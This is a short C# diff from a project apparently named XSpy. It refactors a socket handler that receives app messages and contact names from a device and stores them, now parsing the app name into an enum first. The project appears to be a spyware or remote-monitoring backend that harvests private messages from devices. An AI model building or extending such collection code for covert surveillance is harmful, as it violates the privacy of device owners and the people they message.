@@ -12,7 +12,7 @@ using XSpy.Database.Entities;
 using XSpy.Database.Entities.Devices;
 using XSpy.Database.Services;
 using XSpy.Database.XSpy.Shared.Models.Interfaces;
-using XSpy.Shared.DataTransfer;
+using XSpy.Shared.Models;
 using XSpy.Shared.Models.Requests.Devices;
 using XSpy.Utils;
 using File = System.IO.File;
@@ -134,12 +134,15 @@ namespace XSpy.Socket
         //GET APP MSG
         public async Task _0xAM(string request, string contact, string appName)
         {
+            if (!Enum.TryParse(appName, out AppType appType))
+            {
+                return;
+            }
+
             var fileRequest = JsonConvert.DeserializeObject<List<SaveAppMessageRequest>>(request);
 
             var device = GetDeviceId();
-
-
-            await _deviceService.StoreAppMessages(device, fileRequest, appName, contact);
+            await _deviceService.StoreAppMessages(device, fileRequest, appType, contact);
         }
 
 
